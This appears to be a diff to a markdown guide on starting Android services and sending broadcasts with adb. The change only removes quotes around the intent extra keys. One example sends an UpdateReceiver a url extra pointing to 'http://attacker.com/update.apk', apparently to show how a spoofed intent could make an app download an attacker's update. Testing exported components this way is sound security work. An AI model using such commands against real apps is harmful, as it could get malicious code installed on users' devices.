@@ -65,7 +65,7 @@ adb shell am startservice -n com.example.app/.SyncService
 ```bash
 adb shell am startservice -n com.example.app/.BackgroundService \
     -a com.example.app.ACTION_SYNC \
-    --es "userId" "42"
+    --es userId "42"
 ```
 
 
@@ -86,7 +86,7 @@ adb shell am broadcast -n <package>/<receiver> -a <action>
 ```bash
 adb shell am broadcast -n com.example.app/.MyReceiver \
     -a com.example.app.ACTION_NOTIFY \
-    --es "message" "Hello from ADB"
+    --es message "Hello from ADB"
 ```
 
 2. Simulate system broadcasts:
@@ -98,7 +98,7 @@ adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
 ```bash
 adb shell am broadcast -n com.example.app/.UpdateReceiver \
     -a com.example.app.ACTION_UPDATE \
-    --es "url" "http://attacker.com/update.apk"
+    --es url "http://attacker.com/update.apk"
 ```
 
 
